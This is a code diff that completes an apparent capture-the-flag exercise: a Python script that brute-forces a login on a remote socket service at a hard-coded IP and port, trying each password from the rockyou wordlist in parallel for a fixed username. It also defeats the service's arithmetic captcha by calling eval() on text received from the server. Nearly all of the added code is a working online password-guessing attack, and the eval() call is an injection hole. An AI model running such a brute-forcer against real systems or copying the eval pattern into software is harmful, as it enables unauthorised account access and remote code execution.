@@ -25,10 +25,13 @@
 """
 
 import socket
+from time import sleep
+from multiprocessing import Pool
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "157.230.179.99"
+port = 1337
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+username = "ejnorman"
 
 def brute_force():
     """
@@ -55,11 +58,49 @@ def brute_force():
             v0idcache's server.
     """
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+
+    passwords = open(wordlist, 'r').read().split('\n')
+
+    p = Pool()
+
+    print(set(p.map(try_pass, passwords)))
+
+def try_pass(password):
+    #print(password)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    sleep(2)
+
+    try:
+        solve_captcha(s)
+    except SyntaxError:
+        solve_captcha(s, True)
+
+    data = s.recv(1024)
+
+    s.send(username + '\n')
+    data = s.recv(1024)
+    print("Trying password: " + password)
+    s.send(password + '\n')
+    sleep(1)
+    data = s.recv(1024)
+    if data[:4] != 'Fail':
+        print("Possible password: " + password + data)
+        return password
+    else:
+        print("Fail")
+        return "Fail"
+    #print('returned: ' + str(data.split('\n')))
 
 
-
+def solve_captcha(soc, again=False):
+    data = soc.recv(1024).split('\n')
+    #print(data)
+    if again:
+        captcha = data[0].split('=')[0]
+    else:
+        captcha = data[2].split('=')[0]
+    soc.send(str(eval(captcha)) + '\n')
 
 if __name__ == '__main__':
     brute_force()
